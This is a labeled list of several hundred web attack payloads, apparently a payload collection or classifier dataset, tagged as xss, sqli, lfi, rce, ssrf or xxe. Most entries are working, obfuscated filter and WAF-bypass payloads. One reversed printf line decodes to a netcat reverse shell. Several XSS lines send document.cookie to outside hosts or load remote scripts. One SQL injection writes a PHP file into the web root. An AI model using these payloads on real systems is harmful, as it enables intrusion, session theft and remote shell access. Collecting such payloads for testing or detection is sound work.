javascript:%ef%bb%bfalert(XSS),xss,,,,,,
%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F,xss,,,,,,
%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd,lfi,,,,,,
../../etc/passwd,lfi,,,,,,
"<svG/x="">""/oNloaD=confirm()//",xss,,,,,,
http://⑯⑨。②⑤④。⑯⑨｡②⑤④/,ssrf,,,,,,
http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/,ssrf,,,,,,
http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/,ssrf,,,,,,
http://②⑧⑤②⓪③⑨①⑥⑥:80/,ssrf,,,,,,
http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/,ssrf,,,,,,
http://⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥,ssrf,,,,,,
alert?.(document?.cookie),xss,,,,,,
<x/ onpointerRawupdatE=+\u0061\u006cert&DiacriticalGrave,1&DiacriticalGrave,>Tocuch me!,xss,,,,
"<input accesskey=X onclick=""self['wind'+'ow']['one'+'rror']=alert;throw 1337;"">",xss,,,,,,
<lol/onauxclick=[0].some(alert)>rightclickhere,xss,,,,,,
"\""<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss",xss,,,,,,
marquee loop=1 width=0 onfinish=pr\u006fmpt(document.cookie)>Y000</marquee>,xss,,,,,,
"<svg onload='new Function`[""_Y000!_""].find(al\u0065rt)`'>",xss,,,,,,
"<svg onload=""[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162'] ('\141\154\145\162\164\50\61\51')()"">",xss,,,,,,
<svg onload=&#97&#108&#101&#114&#116(1)>,xss,,,,,,
"<svg onload='new Function`[""_Y000!_""].find(al\u0065rt)`'>",xss,,,,,,
$(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev),rce,,,,,,
<svg%09%0a%0b%0c%0d%a0%00%20onload=alert (1)>,xss,,,,,,
"Function(""\x61\x6c\x65\x72\x74\x28\x31\x29"")();",xss,,,,,,
"<svg onload=alert("""")>",xss,,,,,,
"<svg onload=alert%26%230000000040"""")>",xss,,,,,,
<svg onx=() onload=(confirm)(1)>,xss,,,,,,
<object/data=javascript:alert()>,xss,,,,,,
"<a/href=""javascript%0A%0D:alert()"">",xss,,,,,,
"-(a=alert,b=""_Y000!_"",[b].find(a))-'",xss,,,,,,
-alert(1)-',xss,,,,,,
<marquee loop=1 onfinish=alert( )>x,xss,,,,,,
Javascript://%E2%80%A9alert(618),xss,,,,,,
"~2; ""%3Cscript%3Ealert(document.cookie)%3C/script%20ByPass%3E""",xss,,,,,,
for(t?c.outerHTmL=o:i=o=’’,i++<1024,o+=`<code onclick=this.innerHTmL=’${M(i)?’*’:n||’·’}’>#</code>${i%64?’’:’<p>’}`)for(n=j=0,j<9,n+=M(i-65+j%3+(j++/3|0)*64))M=i=>i>64&i<960&i%64>1&C(i*i)>.7,xss,,
"<sVg OnPointerEnter=""location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div"">",xss,,,,,,
%00' UNION SELECT password FROM Users WHERE username-'tom'--,sqli,,,,,,
/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/OM/**/Users/**/WHE/**/RE/**/usersame/**/LIKE/**/'tom'--,sqli,,,,,,
$ <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=? ------,xss,,,,,,
"<img src=1 onerror=""a:b:c:d:alert(1)"">",xss,,,,,,
<iframe src=javascript:src=http://top.name></iframe>,xss,,,,,,
<svg onx=() onload=(confirm)(1)>,xss,,,,,,
cat /etc/pa?swd,rce,,,,,,
cat /etc/pa’ss’wd,rce,,,,,,
cat /etc/pa**wd,rce,,,,,,
ec’h’o ‘cat /etc/examplewd’ | sed ‘s/example/pass/g’ | bash,rce,,,,,,
"[“1807192982')) union select 1,2,3,4,5,6,7,8,9,0,11#”]",sqli,,,,,,
"[“1807192982')) union se”,”lect 1,2,3,4,5,6,7,8,9,0,11#”]",sqli,,,,,,
"[“1807192982')) union/**/select/**/1,/**/2,/**/3,/**/4,/**/5,/**/6,/**/7,/**/8,/**/9,/**/’pentestit’,/**/11#”]",sqli,,,,,,
"<iframe src=data:text/html,<iframe src=""data:text/html;base64,PD8+PD8+TT9MSz9KSyNAJDpMQCNKXkBePHNjcmlwdD5hbGVydCgnQml0QmFyZyA6KScpOzwvc2NyaXB0Pgo="">",xss,,,,,,
<a href=javas%26#99,ript:prompt%26#x28document.domain)>xss,xss,,,,,
<script/%00%00v%00%00>document.location.href=location.hash.slice(1)</script>#javascript:alert(document.cookie),xss,,,,,,
<script> http://window.name=`<img src=x onerror=alert(top.document.domain)>` location=`https://domain/?xss=<iframe src=javascript:src=http://top.name>x</iframe>` </script>,xss,,,,,,
"""><video><source onerror=eval(atob(http://this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>",xss,,,,,,
"<svg><script xlink:href=""{ASCII}data:,alert(1)""></script></svg>",xss,,,,,,
"<svg/OnLoad=""`${prompt``}`"">",xss,,,,,,
<xssBypass/onpointermove=(confirm)(1)>MoveMouseHere,xss,,,,,,
{{constructor.constructor('alert(1)')()}},xss,,,,,,
{{constructor.constructor(alert`1`)()}},xss,,,,,,
"onerror=""x='ale';z='r';y='t';p='`XSS`';new constructor.constructor`zzz${`${x}${z}${y}${p}`}bbb`",xss,,,,,,
Hh'><script>alert(1)</script> = waf,xss,,,,,,
Hh'><marquee loop=1 width=0 onfinish=pr\u006fmpt`_Y000!_`>Y000</marquee> = waf bypassed,xss,,,,,,
"onerror=""x='ale';z='r';y='t';p='`XSS`';new constructor.constructor`zzz${`${x}${z}${y}${p}`}bbb`",xss,,,,,,
"<?xml version=""1.0"" encoding=""UTF-7""?> +ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY",xxe,,,,,,
"""on{{click=prompt(document['cookie'])/*}}*/>",xss,,,,,,
"Tarun~<""><details/open/ontoggle=""jAvAsCrIpT&colon;alert&lpar;/xss-by-tarun/&rpar;"">XXXXX</a>",xss,,,,,,
"%55%4eiON SeLeCt 1,2...",sqli,,,,,,
%22%3e%3c%5K/onwheel=alert(1)%3emouse%20wheel%20here%3c%21--,xss,,,,,,
"<video src=x onerror=""prompt(xss"">",xss,,,,,,
"<video src=x onerror=""prompt(xss)"">",xss,,,,,,
"<video src=x onerror1=""prompt(xss)"">",xss,,,,,,
"<sVg OnPointerEnter=""location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div"">",xss,,,,,,
<iframe src=java&Tab,sc&Tab,ript:al&Tab,ert()></iframe>,xss,,,
"<iframe src=""java sc ript:al ert()""></iframe>",xss,,,,,,
"{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}",xss,,,,,,
"<svg/OnLoad=""`${prompt``}`"">",xss,,,,,,
%3Cx/Onpointerrawupdate=confirm%26lpar,)%3Exxxxx,xss,,,,,
%60%2balert/**/(1)%2b%60,xss,,,,,,
"<details/open/ontoggle=""self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"">",xss,,,,,,
"union (/*!/**/ SeleCT */ 1,2....)",sqli,,,,,,
"tarun""><x/onafterscriptexecute=confirm%26lpar;)//",xss,,,,,,
{{constructor.constructor('eval(atob(\'amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5jb29raWUp\'))')()}},xss,,,,,,
"≋ ""><!'/*""*\'/*\""/*--></Script><Image SrcSet=K */; OnError=confirm(document.domain) //># ≋",xss,,,,,,
%2f%2a%2a%2f%75%6e%69%6f%6e%2f%2a%2a%2f%73%65%6c%65%63%74,sqli,,,,,,
"(select%20group_concat(table_name,0x3a,column_name,0x5c6e)%20from%20information_schema.columns%20where%20table_schema=database())",sqli,,,,,,
"%55nion(%53elect+1,2,3,/*!50000concat*/(0x3c7363726970743e616c657274607873735f795f73716c5f62795f59303030215f,0x5c6e,0x2d2d2d2d2d2d,0x5c6e,0x7573756172696f3a3a,user(),0x603c2f7363726970743e)...",sqli,,,,,,
/*!%55NiOn*/%20/*!%53eLEct*/+,sqli,,,,,,
"-1945+/*!%55NiOn*/%20/*!%53eLEct*/+1,2,3,%27soy%20vulnerable%27,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19+--+",sqli,,,,,,
""">'><details/open/ontoggle=confirm('XSS')>",xss,,,,,,
"<input type=""hidden"" value=""mypayload"" /> %22%20autofocus%20onfocus%3d(confirm)(1)%2f%2f",xss,,,,,,
%22%20autofocus%20onfocus%00%3d(confirm)(1)%2f%2f,xss,,,,,,
/*!50000%55nIoN*/+/*!50000%53eLeCt*/+,sqli,,,,,,
"a' UNION SELECT 1, NULL, NULL, table_name, column_name FROM information_schema.columns -- - \u0061\u0027\u0020\u0055\u004E\u0049\u004F\u004E\u0020\u0053\u0045\u004C\u0045\u0043\u0054\u0020\u0031\u002C\u0020\",sqli,,,,,,
javascript:new%20Function`al\ert\`1\``,,xss,,,,,
""">'><details/open/ontoggle=confirm('XSS')>",xss,,,,,,
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,xss,,,,,,
&quot,&gt,&lt,img src=x onerror=confirm(1),&gt,,xss,
,+$u+cat+/etc$u/passwd$u,rce,,,,,
,+$u+cat+/etc$u/passwd+\#,rce,,,,,
/???/??t+/???/??ss??,rce,,,,,,
/?in/cat+/et?/passw?,rce,,,,,,
window['alert'](),xss,,,,,,
this['alert'](),xss,,,,,,
(alert)(),xss,,,,,,
eval(atob('YWxlcnQoKQ==')),xss,,,,,,
document['cookie'],xss,,,,,,
<svg onx=() onload=(confirm)(1)>,xss,,,,,,
/**8**/and/**8**/0/**8**//*!50000union*//**8**//*!50000select*//**8**/+ numero de columnas +--+,sqli,,,,,,
<img src onerror=confirm(1)>,xss,,,,,,
&gt,+src+onerror=confirm&lpar,1&rpar,&lt,,xss,,
&gt,+src+onerror=confirm&amp,lpar,1&amp,rpar,&lt,,xss
/etc/passwd,rce,,,,,,
/e?c/?asswd,rce,,,,,,
/e*c/*asswd,rce,,,,,,
/??c/?asswd,rce,,,,,,
/??c/?assw?,rce,,,,,,
"""></textarea><ScRiPt>prompt(1)</ScRiPt// ""><iframe/onload=alert(1)// ”/>&_lt;_script>alert(1)&_lt;/scr_ipt&gt”/>",xss,,,,,,
"«input»; p=-alert(1)}//\ $result* var n = {a: ""-alert(1)}//\"", b: ""-alert(1)}//\""};",xss,,,,,,
"«input»; p=\&q=-alert(1)// $result* var n = {a: ""\"", b: ""-alert(1)}//""};",xss,,,,,,
"<x onauxclick=a=alert,a(domain)>click",xss,,,,,,
'x'%2520onclick='confirm%601%60',xss,,,,,,
%0A%0d+select+user+from+dual+%0A%0D,sqli,,,,,,
image src\r\n=valid.jpg onloadend='new class extends (co\u006efir\u006d)/**/`` &lcub,&rcub,'>,xss,,,,
""">'><details/open/ontoggle=confirm('XSS')>",xss,,,,,,
"?url=""onm<>ouseover=""ale<>rt(1)",xss,,,,,,
document.write(atob('PGltZyBzcmM9aHR0cDovL2xvY2FsaG9zdDo4MDkvcD89') + btoa(document.cookie) + '>'),xss,,,,,,
window[document.body.innerText.charAt(document.body.innerText.indexOf('a'))+'lert'](1),xss,,,,,,
"<img src=something onauxclick=""new Function `al\ert\`xss\``"">",xss,,,,,,
"?url=""onm<>ouseover=""ale<>rt(1)",xss,,,,,,
"""un<>ion sel<>ect""",sqli,,,,,,
/*!50000%55nIoN*/+/*!50000%53eLeCt*/+,sqli,,,,,,
`payload´, %3Cimg src='null' onerror=alert('spyerror')%3E,xss,,,,,
<details onauxclick=confirm`xss`></details>,xss,,,,,,
file:///etc/./passwd,lfi,,,,,,
<style>@keyframes a{}b{animation:a;}</style> <b/onanimationstart=prompt`${document.domain}&#x60;>,xss,,,,,,
`curl -L http://ⒼⓄⓄⒼⓁⒺ.ⒸⓄⓂ`,rce,,,,,,
"<audio autoplay onloadstart=this.src='hxxps://msf.fun/?c='+document[""cook""+""ie""]' src=x>",xss,,,,,,
<bleh/onclick=top[/al/.source+/ert/.source]&Tab,``>click,xss,,,,,
/<img%20id=%26%23x101,%20src=x%20onerror=%26%23x101,,alert`1`,>,xss,,
/<svg%0Aonauxclick=0,[1].some(confirm)//,xss,,,,,
,+$u+cat+/etc$u/passwd$u,rce,,,,,
,+$u+cat+/etc$u/passwd+\#,rce,,,,,
/???/??t+/???/??ss??,rce,,,,,,
/?in/cat+/et?/passw?,rce,,,,,,
SELECT-1e1FROM`test`,sqli,,,,,,
SELECT~1.FROM`test`,sqli,,,,,,
SELECT\NFROM`test`,sqli,,,,,,
SELECT@^1.FROM`test`,sqli,,,,,,
SELECT-id-1.FROM`test`,sqli,,,,,,
"<details/open/ontoggle=""self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"">",xss,,,,,,
"{` <body \< onscroll =1(_=prompt,_(String.fromCharCode(88,83,83,32,66,121,32,77,111,114,112,104,105,110,101)))> ´}",xss,,,,,,
<svg%0Aonauxclick=0,[1].some(confirm)//,xss,,,,,
"(xss""><!--><svg/onload=alert(document.domain)>)",xss,,,,,,
<base href=//knoxss.me>,xss,,,,,,
"<!ENTITY % data SYSTEM ""netdoc:/etc/passwd"">",xxe,,,,,,
sle%25p%28'0x12'%2b1) => sleep('ox12' + 1),sqli,,,,,,
<form><button formaction=javascript:top['ev'+'al'](self['\x61\x74\x6f\x62'](`YWxlcnQoMSk7`)),//,xss,,,,,
"""<> au<>tof<>ocus o<>nfo<>cus=<>al<>ert<>(1<>)",xss,,,,,,
""" onauxclick=confirm`xss` """,xss,,,,,,
<svg onauxclick='a=alert,b=document,a(b.domain)'>,xss,,,,
%22onauxclick=alert`xss`+a,xss,,,,,,
"</pre><!-%00-><svg/%0D%0A%0D%0A/Id=""a""/TABindex=""1""/onload=""\u0061lert(1);"">",xss,,,,,,
"<script src=""https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1…)""></script>",xss,,,,,,
""">'><details/open/ontoggle=confirm('XSS')>",xss,,,,,,
%27,%0d%0d}),%0d{onerror=prompt}throw document.location</ScRipT//,xss,,,,
"<object/data=""javascript&colon;alert/**/(document.domain)"">//",xss,,,,,,
"<iframe/onload='this[""src""]=""javas&Tab;cript:al""+""ert``""';>",xss,,,,,,
<img/src=q onerror='new Function`al\ert\`1\``'>,xss,,,,,,
"open(""https://host/?xss=%3Ca/href=javascript:1%26%26%26%23x6e;ame%3Eclick me%3C/a%3E"",""<svg onload=alert(document.domain)>"");",xss,,,,,,
"';!--""<XSS>=&{()}",xss,,,,,,
"<IMG SRC=""javascript:alert('XSS');"">",xss,,,,,,
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",xss,,,,,,
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",xss,,,,,,
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",xss,,,,,,
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss,,,,,,
<img src=x:alert(alt) onerror=eval(src) alt='spyerror'>,xss,,,,,,
"""></tag><svg onload=alert(spyerror)>",xss,,,,,,
"<iframe/src=data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=></iframe>",xss,,,,,,
<img%20id=%26%23x101,%20src=x%20onerror=%26%23x101,,alert`1`,>,xss,,
"["" <style>@KeyFrames z{</style><div style=animation-name:z onanimationend=&#97&#108&#101&#114&#116&grave;1&grave;> %253Cscript%253Ealert('XSS')%253C%252Fscript%253E ""</script> ""]",xss,,,,,,
<!<script>alert(1)</script> “,xss,,,,,,
"<details open ontoggle='self[""ale""%2b""rt""]&lpar;document&period;domain&rpar;'>",xss,,,,,,
<svg/onload=%26nbsp,alert`bohdan`+,xss,,,,,
<img src onerror=%26emsp,prompt`${document.domain}`>,xss,,,,,
%3Cscript%3Ealert(document.cookie)%3C/script%20ByPass%3E,xss,,,,,,
"<iframe/onload='this[""src""]=""jav""+""as&Tab;cr""+""ipt:al""+""er""+""t()""';>",xss,,,,,,
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`,//,xss,,,,,
,+$u+cat+/etc$u/passwd$u,rce,,,,,
,+$u+cat+/etc$u/passwd+\#,rce,,,,,
"<div style=""background:url(/f#&#127;oo/;color:red/*/foo.jpg);"">X",xss,,,,,,
"</Scrpt/""%27--!>%20<Scrpt>%20confirm(1)%20</Scrpt>",xss,,,,,,
"</> "" <a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'> "" </>",xss,,,,,,
/* <audio src=1 onloadstart=alert&lpar,1&rpar,//> */,xss,,,,
<img%20id=%26%23x101,%20src=x%20onerror=%26%23x101,,alert`1`,>,xss,,
<style>img{background-image:url('javascript:alert(1)')}</style>,xss,,,,,,
<style>*{background-image:url('\6A\61\76\61\73\63\72\69\70\74\3A\61\6C\65\72\74\28\6C\6F\63\61\74\69\6F\6E\29')}</style>,xss,,,,,,
"""><iframe srcdoc='%26lt;script>;prompt${document.domain}%26lt;/script>'>",xss,,,,,,
"xss'""><iframe srcdoc='%26lt;script>;alert(1)%26lt;/script>'>",xss,,,,,,
<--`<img%2fsrc%3d` onerror%3dalert(document.domain)> --!>,xss,,,,,,
"""<BODY onload!#$%&()*~+-_.###:;?@[/|\]^`=alert(“XSS”)>""",xss,,,,,,
"""><input/onauxclick=""[1].map(prompt)"">",xss,,,,,,
"<details open ontoggle=""{alert`1`}""></details>",xss,,,,,,
"<j id=x style=""-webkit-user-modify:read-write"" onfocus={window.onerror=eval}throw/0/+name>H</j>#x",xss,,,,,,
%20foo_bar%00=foo%20bar%00=foo%5bbarfoo[bar,xss,,,,,,
"data:text/html,<form action=https://brutelogic.com.br/xss-cp.php method=post><input type=hidden name=a value=""<img/src=//knoxss.me/yt.jpg onpointerenter=alert`1`>""><input type=submit></form>",xss,,,,,,
"<j id=x style=""-webkit-user-modify:read-write"" onfocus={window.onerror=eval}throw/0/+name>H</j>#x",xss,,,,,,
"1'""><img/src/onerror=.1|alert``>",xss,,,,,,
<!<script>alert(document.domain)</script>,xss,,,,,,
<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>,xss,,,,,,
<!<script>confirm(1)</script>,xss,,,,,,
<bleh/ondragstart=&Tab,parent&Tab,['open']&Tab,&lpar,&rpar,%20draggable=True>dragme,xss,
eval('al'+'ert'+'(12)'),//,xss,,,,,
$(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev),rce,,,,,,
<iframe src=java&Tab,sc&Tab,ript:al&Tab,ert()></iframe>,xss,,,
"<iframe src=""java sc ript:al ert()""></iframe>",xss,,,,,,
"xss'""><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>",xss,,,,,,
<svg onload=prompt%26%230000000040document.domain)>,xss,,,,,,
<svg onload=prompt%26%23x000000028,document.domain)>,xss,,,,,
"- xss""></a><input value=""Type anything""onbeforeinput=""prompt%26lpar%3Bdocument.domain%26rpar%3B""><!--",xss,,,,,,
"/???/??t /???/??ss??'."" --",rce,,,,,,
><tag onxxxx=alert(1)>,xss,,,,,,
"><tag onxxxx=""'a'|alert(1)"">",xss,,,,,,
"<iframe name=""<svg/onload=alert(23)>"" src=""http://example[.]com/x.php?age=23;%0adocument.body.innerHTML=name//"">",xss,,,,,,
http://example[.]com/x.php?age=23,%0adocument.body.innerHTML=location.hash,//#<svg/onload=alert(23)>,xss,,,,
"<svg onload\r\n=$.globalEval(""al""+""ert()"");>",xss,,,,,,
<input/oninput='new Function`confir\u006d\`0\``'>,xss,,,,,,
"<p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True>dragme",xss,,,,,,
<lol/onauxclick=[0].some(alert)>rightclickhere,xss,,,,,,
<iframe/src='%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:prompt`1`'>,xss,,,,,,
"param=XSS""%0D<body='X' onmouseover=setInterval`alert\x28&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;\x29`//",xss,,,,,,
cd..\..\..\..\ && dir,rce,,,,,,
cd..&&cd..&&cd..&&cd..&&dir,rce,,,,,,
%22%3E%3Cd3v%2Fonauxclick%3D%5B2%5D.some%28confirm%29%3Eclick,xss,,,,,,
%3balert`1`%3b,xss,,,,,,
../../../../../../e*c/p*s*d{{' http://server/...,rce,,,,,,
system(“cat /etc/passwd”),,rce,,,,,
<--`<img/src=`%20onerror=confirm``>%20--!>,xss,,,,,,
".1union/**_**/select/*!.1*/,2,3--+",sqli,,,,,,
"uNioN sElEcT 1,2,vErSiOn(),4,5;-- -",sqli,,,,,,
"""/*'/*`/*--><html \"" onmouseover=/*&lt;svg/*/onload=alert()//>",xss,,,,,,
//comment%0a%0dalert(0),,xss,,,,,
%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0),xss,,,,,,
"""/*'/*`/*--><html \"" onmouseover=/*&lt;svg/*/onload=alert()//>",xss,,,,,,
<!<script>alert(4)</script>,xss,,,,,,
"<a href=""j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;"">X</a>",xss,,,,,,
<marquee loop=1 width=0 onfinish=alert`1`>XSS</marquee>,xss,,,,,,
"if/*!90000*/((3*9)>(0),sLeEp/*!80000*/(10),0)/*",sqli,,,,,,
"Tarun~<""><details/open/ontoggle=""jAvAsCrIpT&colon;alert&lpar;/xss-by-tarun/&rpar;"">XXXXX</a>",xss,,,,,,
"onload=\""a='alert()';d='XSS ';b='t(d)';c=a+b;console.log(eval(c));",xss,,,,,,
"a<%00meta name=""i"" HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/h%00tml;base64,PHNjcmlwdD5hbGVydCgiT1BFTkJVR0JPVU5UWSIpOzwvc2NyaXB0Pg=="">",xss,,,,,,
""">a<marquee onstart='constructor.constructor(atob(""ywxlcnqoj09qru5cvudct1vovfknkq""))()'></marquee>",xss,,,,,,
"%22%3E%3Cobject%20data=data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%3E%3C/object%3E",xss,,,,,,
"""><block%quote oncontextmenu%3Dconfirm(1)>Right click me</blockquote><!--",xss,,,,,,
"?""></script><base%20c%3D=href%3Dhttps:\targetsite>",xss,,,,,,
<a href=javas&#99,ript:alert(1)>,xss,,,,,
"<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>",xss,,,,,,
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",xss,,,,,,
"<style><img src=""</style><img src=x ""><object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>",xss,,,,,,
"\u0065\u0076\u0061\u006C('ablolzers'['replace'](""b"",""l"")['replace'](""lolzers"",""ert""))`1`",xss,,,,,,
"s = '""><script>alert(1)</script>' print 'eval(String.fromCharCode('+"","".join([str(ord(o)) for o in s])+'))'",xss,,,,,,
"<svg><script xlink:href=data:,alert(1) />",xss,,,,,,
<form action=javascript:alert(1)><input type=submit>,xss,,,,,,
"jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",xss,,,,,,
eeee<%2fscript><script>prompt(/XSS/.source)<%2fscript>yyyy,xss,,,,,,
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A,sqli,,,,,,
<svg/onload=self[`aler`%2b`t`]`1`>,xss,,,,,,
 INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo(),?>,sqli,,,,,
"<iframe/onload='this[""src""]=""javas&Tab;cript:al""+""ert``""';>",xss,,,,,,
<img/src=q onerror='new Function`al\ert\`1\``'>,xss,,,,,,
/*!50000union select*/,sqli,,,,,,
/*!12345union select*/,sqli,,,,,,
/*!13337union select*/,sqli,,,,,,
"sg7cx""%20onerror%3d""confirm(document.domain)""gd67e",xss,,,,,,
src=x:alert(alt) alt=3117,xss,,,,,,
<scronerror=ipt>prompt(document.domain)</scronerror=ipt>,xss,,,,,,
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",xss,,,,,,
~${ OGNL Payload },rce,,,,,,
"<brute+onbeforescriptexecute=a=alert,a(1%26%23x29>",xss,,,,,,
%23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect,sqli,,,,,,
/foo/../etc/bar/../passwd,lfi,,,,,,
"<svg><script xlink:href=""{ASCII}data:,alert(1)""></script></svg>",xss,,,,,,
<marquee/onstart=c=String.fromCharCode,confirm(c(47)+c(88)+c(83)+c(83)+c(47))>,xss,,,,,
"""><input type=""submit"" formaction=""javascript&colon;this&lsqb;'a'&plus;'lert'&rsqb;`1`""",xss,,,,,,
"<p style=""height:100px"" onwheel=""self['al'+'ert'](self['ev'+'al']('docu'+'ment.coo'+'kie'))""></p>",xss,,,,,,
*!50000group_coNcat(*/) /*!50000coNcat(*/) `coNcat`%0a%0b%0c%0d%a0() concat/**x**/(),sqli,,,,,,
param?id=@:=(%23 a %0a select 123 from ((table)))/1e0union%23 a %0a,sqli,,,,,,
<video autoplay onplay=alert`1` src=//w3schools.com/tags/movie.mp4>,xss,,,,,,
"<input type=search onsearch=""location='data:text/html;\x62\x61\x73\x65\x36\x34,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='"">",xss,,,,,,
<input onf%0Aocus=alert(1) autofocus/,xss,,,,,,
%0a ls -la,rce,,,,,,
"<!DOCTYPE :_-_: SYSTEM ""ftp://x.s.artsploit.com/"">",xxe,,,,,,
<img onerror=$.getScript(String.fromCharCode(*CODE*)), src='asd'> where *CODE* = scripturl,xss,,,,,
"<meta/content=""0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg==""http-equiv=refresh>",xss,,,,,,
"0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",xss,,,,,,
<marquee loop=1 width=0 onfinish=prompt(1)>1</marquee>,xss,,,,,,
/**/ORDER/**/BY/**/,sqli,,,,,,
/*!order*/+/*!by*/,sqli,,,,,,
/*!ORDER BY*/,sqli,,,,,,
/*!50000ORDER BY*/,sqli,,,,,,
"?url=""onm<>ouseover=""ale<>rt(0)",xss,,,,,,
"<img/src=""x""/onerror=""prom\u0070t&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;"">",xss,,,,,,
"""><h2 id=""Iamheading""onmouseover=""confirm(1)"">",xss,,,,,,
<a x href=javascript%26%23x3A%3Bconfirm(1)>a</a>,xss,,,,,,
%253C%252Fscript%253E%253Cscript%253Ealert%2528%2527XSS%2520here%2521%2527%2529%253C%252Fscript%253E,xss,,,,,,
/???/???/c?t$IFS/???/p?s?w?,rce,,,,,,
<sCRipT>alert(1)</sCRiPt>,xss,,,,,,
<script>%0d%0aalert(1)</script>,xss,,,,,,
<scr<script>ipt>alert(1),</scr</script>ipt>,xss,,,,,
"<a/href=""j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;"">",xss,,,,,,
<svg•onload=alert(1)>,xss,,,,,,
?><img src=x onmouseleave=print()>,xss,,,,,,
?><a/\test=?%26quot;x%26quot;?href=?%01javascript:/*%b1*/;location.assign(?//hackerone.com/stealthy?x=?+location)?>Click,xss,,,,,,
<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>,xss,,,,,,
<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>,xss,,,,,,
<svg><circle><set onbegin=prompt(1) attributename=fill>,xss,,,,,,
"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>",xss,,,,,,
%3balert`1`%3b,xss,,,,,,
"asd""`> onpointerenter=x=prompt,x`XSS`",xss,,,,,,
<x onauxclick=import('//1152848220/')>click,xss,,,,,,
"<x onauxclick=a=alert,a(domain)>click -@niksthehacker",xss,,,,,,
<x onauxclick=import('//1152848220/')>click,xss,,,,,,
<x onauxclick=import('//xss/')>click,xss,,,,,,
"\""<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss",xss,,,,,,
{{constructor.constructor(alert`1`)()}},xss,,,,,,
javascript:new%20Function`al\ert\`1\``;,xss,,,,,,
<script>Object.prototype.BOOMR = 1;,xss,,,,,,
Object.prototype.url='https://portswigger-labs.net/xss/xss.js'</script> -https://portswigger.net/web-security/cross-site-scripting/cheat-sheet,xss,,,,,,
">%0D%0A%0D%0A<x '=foo""><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>",xss,,,,,,
>'><details/open/ontoggle=confirm('XSS')>,xss,,,,,,
